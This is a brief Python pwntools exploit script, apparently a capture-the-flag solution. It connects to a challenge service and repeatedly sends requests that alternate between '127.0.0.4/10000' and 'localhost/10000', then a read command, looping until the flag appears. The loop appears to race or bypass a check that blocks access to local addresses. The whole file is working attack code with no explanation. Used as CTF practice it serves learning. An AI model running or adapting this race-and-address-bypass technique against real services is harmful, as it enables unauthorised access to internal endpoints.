#!/usr/bin/env python3
from pwn import *
import threading
import time
import sys

# Target details
HOST = 'up.zoolab.org'
PORT = 10932

r = remote(HOST, PORT)

while True:
    r.sendline(b"g")
    r.sendline(b"127.0.0.4/10000")
    r.sendline(b"g")
    r.sendline(b"localhost/10000")
    r.sendline(b"v")
    res = r.recvline()
    if b"FLAG" in res:
        log.success(f"{res.decode().strip()}")
        break
r.close()